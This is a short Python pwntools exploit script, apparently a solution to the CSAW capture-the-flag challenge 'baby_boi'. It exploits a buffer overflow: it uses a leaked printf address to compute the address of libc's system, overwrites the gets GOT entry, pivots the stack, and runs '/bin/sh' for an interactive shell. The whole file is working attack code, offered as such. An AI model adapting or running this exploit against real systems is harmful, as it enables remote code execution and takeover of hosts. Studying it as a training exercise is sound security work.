from pwn import *
from struct import *

# use command: ncat -kvl 5566 -c ./baby_boi
r = remote('localhost', 5566)
# r = remote('pwn.chal.csaw.io', 1005)

r.recvuntil(':')

addrPrintf    = int(r.readline()[1:], 0)
addrGetsPlt   = 0x601020
addrMainGet   = 0x400717
libcPrintf    = 0x64e80
libcSystem    = 0x4f440
addrSystem    = addrPrintf - libcPrintf + libcSystem
addrMainLeave = 0x40072d

addrWrite2    = pack('<Q', addrGetsPlt + 0x20)
addrRet       = pack('<Q', addrMainGet)
payload       = 'a' * 0x20 + addrWrite2 + addrRet
r.sendline(payload)

# RSP will be too small, need to do some tricks to make RSP bigger
# newGetsPlt   = pack('<Q', addrSystem)
# binShPath    = pack('<Q', 0x601050 + 0x20)
# payload      = newGetsPlt + 'a' * 0x18  + binShPath + addrRet + '/bin/sh'
# r.sendline(payload)

newGetsPlt    = pack('<Q', addrSystem)
newRSP        = pack('<Q', addrGetsPlt + 0x20 + 0x10 + 0x500)
binShPath     = pack('<Q', addrGetsPlt + 0x20 + 0x10 + 0x500 + 0x10 + 0x20)
addrRet       = pack('<Q', addrMainLeave)
addrRet2       = pack('<Q', addrMainGet)
payload       = newGetsPlt + 'a' * 0x18  + newRSP + addrRet + 'b' * 0x500 + binShPath + addrRet2 + '/bin/sh'
r.sendline(payload)

r.interactive()
